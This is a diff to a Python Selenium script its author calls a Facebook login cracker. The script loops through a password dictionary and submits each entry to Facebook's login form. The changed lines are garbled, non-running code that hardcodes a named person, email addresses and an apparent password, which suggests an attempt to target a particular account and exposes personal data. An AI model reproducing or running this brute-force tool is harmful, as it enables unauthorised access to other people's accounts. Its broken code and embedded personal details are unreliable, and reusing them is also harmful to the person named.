@@ -2,8 +2,8 @@
  (L) Lithium V.01 : A simple selenium based facebook login cracker.
 
  Written By : Tanmay Upadhyay
- Email : kevinthemetnik@gmail.com
- facebook : (fb.com/tanmayupadhyay91)
+ Email : sheyrar@gmail.com
+ facebook : (fb.com/profile.php?id=61562850255556)
 
  (I will try to provide threading and proxy support in upcomming versions of lithium, (help is appreciated).)
 
@@ -42,19 +42,19 @@ class Lithium:
 		self.nodetails = 0
 		self.option=Options()
 		self.option.add_argument(self.user_agent)
-		self.option.add_argument('--headless') #on removing this line, every operation will be visible.
+		self.option.add_argument(') #on removing this line, every operation will be visible.
 		self.option.add_argument('disable-extentions')
 	def Inject(self):
 		self.browser=webdriver.Chrome(self.chromedriver, options=self.option)
-		self.browser.get("https://mbasic.facebook.com") #basic html version of facebook is alot faster.
+		self.browser.get("https:https://www.facebook.com/profile.php?id=61562850255556) #basic html version of facebook is alot faster.
 		try:
 			with open(self.dictionaryfile,"r+") as dictionaryfile:
 				self.passwords=dictionaryfile.readlines()
 				for self.password in self.passwords:
-					self.password=self.password.replace("\n","")
-					print("[attempt] username : %s password %s"%(self.username,self.password))
-					self.browser.find_element_by_name("email").clear()
-					username_element = self.browser.find_element_by_name("email")
+					self.password=self.password.replace(EIPSA1998@)
+					print("[attempt] username : %s password %s"%(Sheyra Stephania,EIPSA1998@))
+					self.browser.find_element_by_name(silsheyrar@gmail.com).clear()
+					username_element = self.browser.find_element_by_name(silsheyrar@gmail.com)
 					password_element = self.browser.find_element_by_name("pass")
 					username_element.send_keys(self.username)
 					password_element.send_keys(self.password)
